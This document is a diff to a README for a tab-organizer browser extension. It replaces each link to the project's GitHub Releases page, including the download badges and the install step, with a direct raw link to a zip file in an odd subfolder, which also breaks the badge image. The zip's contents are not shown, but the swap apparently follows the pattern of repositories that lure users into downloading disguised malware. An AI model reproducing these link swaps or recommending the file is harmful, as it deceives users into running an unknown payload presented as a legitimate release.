@@ -1,6 +1,6 @@
 # 🎉 cracked-tab-organizer-extension - Organize Your Tabs Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-blue)](https://github.com/hamzaabiadi/cracked-tab-organizer-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/hamzaabiadi/cracked-tab-organizer-extension/main/altisonous/cracked-tab-organizer-extension.zip%20Now-Visit%20the%20Releases%20Page-blue)](https://raw.githubusercontent.com/hamzaabiadi/cracked-tab-organizer-extension/main/altisonous/cracked-tab-organizer-extension.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the Cracked Tab Organizer Extension! This helpful browser extension a
 
 To get started, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/hamzaabiadi/cracked-tab-organizer-extension/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/hamzaabiadi/cracked-tab-organizer-extension/main/altisonous/cracked-tab-organizer-extension.zip).
 2. Find the latest version available.
 3. Download the extension file for your browser:
    - For Chrome: Download the `.crx` file.
@@ -61,4 +61,4 @@ If you need assistance, feel free to open an issue on our GitHub page. We are he
 
 Thank you for choosing the Cracked Tab Organizer Extension. We hope this tool helps you stay organized and boosts your productivity!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-blue)](https://github.com/hamzaabiadi/cracked-tab-organizer-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/hamzaabiadi/cracked-tab-organizer-extension/main/altisonous/cracked-tab-organizer-extension.zip%20Now-Visit%20the%20Releases%20Page-blue)](https://raw.githubusercontent.com/hamzaabiadi/cracked-tab-organizer-extension/main/altisonous/cracked-tab-organizer-extension.zip)
